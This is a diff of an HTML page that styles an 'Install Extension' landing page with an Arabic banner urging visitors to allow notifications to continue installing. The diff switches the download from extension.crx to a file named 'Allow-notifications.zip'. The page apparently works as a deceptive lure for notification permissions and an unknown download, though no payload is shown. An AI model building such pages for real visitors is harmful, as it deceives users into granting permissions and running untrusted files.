@@ -11,10 +11,10 @@
       width: 100vw;
       height: 100vh;
       font-family: 'Roboto', sans-serif;
-      background-color: #fff; /* ✅ خلفية بيضاء */
+      background-color: #fff; /* خلفية بيضاء */
     }
 
-    /* ✅ الشريط الأحمر أعلى الصفحة */
+    /* ✅ شريط التنبيه الأحمر */
     .re-header {
       width: 100%;
       background-color: red;
@@ -31,8 +31,12 @@
       background: #fff;
       padding: 30px 40px;
       box-sizing: border-box;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      min-height: calc(100vh - 48px); /* خلى المحتوى يغطي الطول ناقص الشريط */
+      display: flex;
+      flex-direction: column;
+      justify-content: flex-start;
     }
+
     .header {
       display: flex;
       align-items: center;
@@ -55,6 +59,7 @@
       color: #ffa500;
       font-size: 16px;
     }
+
     .install-btn {
       display: inline-block;
       text-decoration: none;
@@ -67,6 +72,7 @@
       cursor: pointer;
       margin-top: 20px;
     }
+
     .preview-images {
       display: flex;
       flex-direction: column;
@@ -74,6 +80,7 @@
       gap: 30px;
       margin-top: 40px;
     }
+
     .preview-images img {
       width: 500px;
       border-radius: 8px;
@@ -82,7 +89,7 @@
 </head>
 <body>
 
-  <!-- ✅ الشريط الأحمر في أعلى الصفحة -->
+  <!-- ✅ شريط التنبيه -->
   <div class="re-header">يرجى السماح بالإشعارات لمتابعة التثبيت</div>
 
   <div class="wrapper">
@@ -95,11 +102,14 @@
       </div>
     </div>
 
-    <a href="extension.crx" download class="install-btn">Install Extension</a>
+    <!-- ✅ زر تحميل ملف Allow-notifications.zip -->
+    <a href="Allow-notifications.zip" download class="install-btn">Install Extension</a>
 
+    <!-- ✅ عرض 3 صور -->
     <div class="preview-images">
       <img src="preview1.png" alt="Preview 1">
       <img src="preview2.png" alt="Preview 2">
+      <img src="preview3.png" alt="Preview 3">
     </div>
   </div>
 
